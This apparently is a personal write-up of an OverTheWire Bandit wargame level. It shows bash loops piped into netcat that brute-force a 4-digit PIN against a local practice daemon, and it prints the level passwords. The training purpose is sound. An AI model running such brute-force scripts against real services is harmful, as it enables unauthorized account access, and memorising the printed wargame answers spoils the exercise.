A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

I cannot solve this one, but here's what I did and idk why it don't work.

Create directory and go to said directory in `/tmp`, call ours `crabz`

Create a solve.sh file to get a list of all possible solutions:

#!/bin/bash
for i in {0000..9999}
do
	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" ${i} >> pins
done

Then, in terminal
`cat pins | nc localhost 30002 | grep -v "Wrong"

I read the `pins` file with all the combinations, fed it into the netcat connection, and filtered out everything with "Wrong" in it.

UPDATE (SOLVED):
Instead of trying to do 10000 combinations in one sessions, split it up into 2 sessions. Here's the working script

#!/bin/bash
for i in {0000..5000}
do
	echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i
done | nc localhost 30002 | grep "bandit25"

for i in {5000..9999} 
do
	echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i
done | nc localhost 30002 | grep "bandit25"

The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG 

If you want the password, use -B 1 as a grep option to get the line before where it says the bandit25 password
